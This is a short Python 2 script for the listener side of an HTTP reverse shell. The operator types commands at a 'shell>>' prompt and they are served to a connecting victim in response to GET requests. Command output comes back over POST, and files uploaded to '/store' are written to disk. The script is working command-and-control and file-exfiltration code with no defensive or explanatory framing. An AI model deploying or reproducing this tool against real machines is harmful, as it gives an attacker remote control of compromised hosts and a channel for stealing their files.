import BaseHTTPServer
import cgi

class handler_class(BaseHTTPServer.BaseHTTPRequestHandler):

    def do_GET(s):
        cmd = raw_input('shell>> ')

        s.send_response(200)
        s.send_header('Content-type','text/html')
        s.end_headers() 
        s.wfile.write(cmd)


    def do_POST(s):

        if s.path=='/store':
            ctype,blah = cgi.parse_header(s.headers['Content-type'])

            if ctype=='multipart/form-data':
                fs = cgi.FieldStorage(fp=s.rfile,
                                      headers = s.headers,
                                      environ = {'REQUEST_METHOD':'POST'}) 
                fs_w = fs['file']
                with open('file.txt','w') as f:
                    f.write(fs_w.file.read())

            else:
                print'[!] Unexpected POST Request'

            s.send_response(200)
            s.end_headers()
            return

        s.send_response(200)
        s.end_headers()
        l = int(s.headers['Content-Length'])
        output = s.rfile.read(l)
        print output


if __name__=='__main__':
    httpd = BaseHTTPServer.HTTPServer(('192.168.145.1',80),handler_class)
    try:
        print"[-] Waiting for the connection"
        httpd.serve_forever()
    except KeyboardInterrupt:
        print"\n[!] You opt to close the server"
        httpd.server_close()
